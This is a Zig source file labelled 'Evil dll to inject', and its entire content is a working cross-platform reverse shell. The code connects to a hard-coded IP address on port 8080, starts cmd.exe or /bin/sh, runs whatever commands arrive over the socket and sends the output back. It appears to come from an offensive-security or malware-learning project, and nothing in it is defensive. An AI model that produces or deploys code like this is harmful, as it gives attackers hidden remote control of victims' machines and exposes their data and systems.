//! Evil dll to inject
const std = @import("std");
const builtin = @import("builtin");
const posix = std.posix;
const net = std.net;
const windows = std.os.windows;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();

    var shell: []const []const u8 = undefined;

    if (builtin.os.tag == .windows) {
        shell = &[_][]const u8{"cmd.exe"};
        std.debug.print("[+] Using cmd.exe as the shell\n", .{});
    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
        shell = &[_][]const u8{"/bin/sh"};
        std.debug.print("[+] Using /bin/sh as the shell\n", .{});
    } else {
        std.debug.print("[*] Selected shell: /bin/sh (fallback)\n", .{});

        std.debug.print("[-] Cannot detect target OS\n", .{});
        std.debug.print("[!] Cannot detect target OS\n", .{});
        return;
    }

    const ipv4 = "172.19.192.194";
    // const ipv4 = "127.0.0.1";
    const port = 8080;
    const address = try std.net.Address.parseIp(ipv4, port);

    // connection
    const socket = try posix.socket(address.any.family, posix.SOCK.STREAM, posix.IPPROTO.TCP);
    defer posix.close(socket);

    // const timeout = posix.timeval{ .sec = 5, .usec = 0 };
    // try posix.setsockopt(socket, posix.SOL.SOCKET, posix.SO.RCVTIMEO, &std.mem.toBytes(timeout));
    // try posix.setsockopt(socket, posix.SOL.SOCKET, posix.SO.SNDTIMEO, &std.mem.toBytes(timeout));

    try posix.connect(socket, &address.any, address.getOsSockLen());
    std.debug.print("Connected to server at {any}\n", .{address});

    var process = std.process.Child.init(shell, allocator);
    process.stdin_behavior = .Pipe;
    process.stdout_behavior = .Pipe;
    process.stderr_behavior = .Pipe;
    process.spawn() catch |err| switch (err) {
        else => {
            std.debug.print("[!] Error during process.\n", .{});
            return;
        },
    };
    std.debug.print("[*] Process spawned successfully.\n", .{});
    defer _ = process.kill() catch {};

    var buffer: [4096]u8 = undefined;

    while (true) {
        // Read command from socket
        std.debug.print("[*] Waiting to read command from socket...\n", .{});

        const bytes_read = try socketRecv(socket, &buffer);
        std.debug.print("Server response: {s}\n", .{buffer[0..bytes_read]});

        // Send command to process
        std.debug.print("[*] Writing command to process stdin...\n", .{});
        _ = process.stdin.?.write(buffer[0..bytes_read]) catch {
            std.debug.print("[!] Error writing to process stdin.\n", .{});
            break;
        };

        // Wait for execution
        std.Thread.sleep(300 * std.time.ns_per_ms);

        // Read output once with reasonable timeout
        std.debug.print("[*] Reading process stdout...\n", .{});
        if (process.stdout.?.read(&buffer)) |output_len| {
            if (output_len > 0) {
                std.debug.print("[*] Writing process stdout to stream...\n", .{});
                try socketSend(socket, buffer[0..output_len]);
            }
        } else |_| {
            // If stdout fails, try stderr
            std.debug.print("[*] Reading process stderr...\n", .{});
            if (process.stderr.?.read(&buffer)) |error_len| {
                if (error_len > 0) {
                    std.debug.print("[*] Writing process stderr to stream...\n", .{});
                    try socketSend(socket, buffer[0..error_len]);
                }
            } else |_| {
                std.debug.print("[!] Error reading from process stderr.\n", .{});
            }
        }
    }

    std.debug.print("[*] Exiting win32MainThread.\n", .{});
    return;
}

// Cross-platform socket receive function
fn socketRecv(socket: posix.socket_t, buffer: []u8) !usize {
    if (builtin.os.tag == .windows) {
        // Windows: Use recv instead of ReadFile
        const result = windows.ws2_32.recv(socket, buffer.ptr, @intCast(buffer.len), 0);
        if (result == windows.ws2_32.SOCKET_ERROR) {
            const err = windows.ws2_32.WSAGetLastError();
            return windows.unexpectedWSAError(err);
        }
        return @intCast(result);
    } else {
        // Unix: Use standard posix recv
        return posix.recv(socket, buffer, 0);
    }
}

// Cross-platform socket send function
fn socketSend(socket: posix.socket_t, data: []const u8) !void {
    var pos: usize = 0;
    while (pos < data.len) {
        const bytes_sent = if (builtin.os.tag == .windows) blk: {
            // Windows: Use send instead of WriteFile
            const result = windows.ws2_32.send(socket, data[pos..].ptr, @intCast(data.len - pos), 0);
            if (result == windows.ws2_32.SOCKET_ERROR) {
                const err = windows.ws2_32.WSAGetLastError();
                return windows.unexpectedWSAError(err);
            }
            break :blk @as(usize, @intCast(result));
        } else blk: {
            // Unix: Use standard posix send
            break :blk posix.send(socket, data[pos..], 0) catch |err| switch (err) {
                else => {
                    break :blk @as(usize, @intCast(0));
                },
            };
        };

        if (bytes_sent == 0) return error.Closed;
        pos += bytes_sent;
    }
}
